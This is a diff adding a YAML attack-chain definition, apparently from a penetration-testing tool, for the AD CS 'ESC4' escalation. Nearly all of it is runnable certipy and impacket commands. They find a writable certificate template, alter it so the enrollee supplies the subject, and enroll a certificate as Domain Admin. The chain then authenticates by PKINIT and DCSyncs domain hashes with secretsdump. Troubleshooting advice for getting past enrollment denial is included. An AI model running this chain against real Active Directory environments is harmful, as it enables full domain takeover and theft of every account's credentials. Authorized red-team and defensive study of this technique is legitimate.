@@ -1,0 +1,64 @@
+chain_id: adcs_esc4_template_write
+title: "AD CS — ESC4 (write rights on a cert template → enrollee-supplies-SAN → DA)"
+severity: CRITICAL
+tags: [ad, adcs, esc4, certipy, dpapi, certificates, dacl-abuse]
+
+trigger:
+  any_of:
+    - { kind: "adcs_template_write" }
+    - { banner_pattern: "(?i)certificate\\s*services|adcs|certsrv" }
+    - { path_pattern: "(?i)/certsrv|/CertEnroll" }
+
+description: |
+  ESC4 is when a low-priv principal has Write/GenericAll on an AD CS
+  certificate template object. You flip the template into "enrollee
+  supplies subject" + add Client/Server Authentication EKU, then
+  enroll a cert pretending to be Domain Admin. PKINIT with that cert
+  yields a TGT for DA, then DCSync. Different from ESC1/ESC8: here
+  you fix the misconfig yourself before exploiting it.
+
+steps:
+  - id: 1
+    title: "Enumerate templates with certipy (find :ESC4: marker)"
+    command: |
+      certipy find -u USER@DOMAIN -p 'PASS' -dc-ip $DC_IP -enabled -vulnerable
+      # Look for: "[!] Vulnerabilities ... ESC4"
+
+  - id: 2
+    title: "Take a backup of the template (so you can restore)"
+    command: |
+      certipy template -u USER@DOMAIN -p 'PASS' -template 'WriteableTpl' \
+        -save-old -dc-ip $DC_IP
+
+  - id: 3
+    title: "Mutate the template: add ENROLLEE_SUPPLIES_SUBJECT + Auth EKUs"
+    command: |
+      certipy template -u USER@DOMAIN -p 'PASS' -template 'WriteableTpl' \
+        -dc-ip $DC_IP
+
+  - id: 4
+    title: "Enroll a cert as Domain Admin"
+    command: |
+      certipy req -u USER@DOMAIN -p 'PASS' -ca CA-NAME \
+        -template 'WriteableTpl' -upn 'Administrator@DOMAIN' \
+        -dc-ip $DC_IP
+
+  - id: 5
+    title: "Restore template + use the cert (PKINIT) → DCSync"
+    command: |
+      certipy template -u USER@DOMAIN -p 'PASS' -template 'WriteableTpl' \
+        -configuration old_WriteableTpl.json -dc-ip $DC_IP
+      certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+      impacket-secretsdump -hashes :<NT> DOMAIN/Administrator@DC.DOMAIN
+
+common_errors:
+  - error: "Template enrollment denied"
+    solution: |
+      Even after the mutation the user must hold `Enroll` on the
+      template. Grant it explicitly during step 3 with
+      `-write-default-sd`. Watch for CES policy modules that block
+      runtime template modification.
+
+references:
+  - https://www.specterops.io/wp-content/uploads/2022/06/Certified_Pre-Owned.pdf
+  - https://github.com/ly4k/Certipy
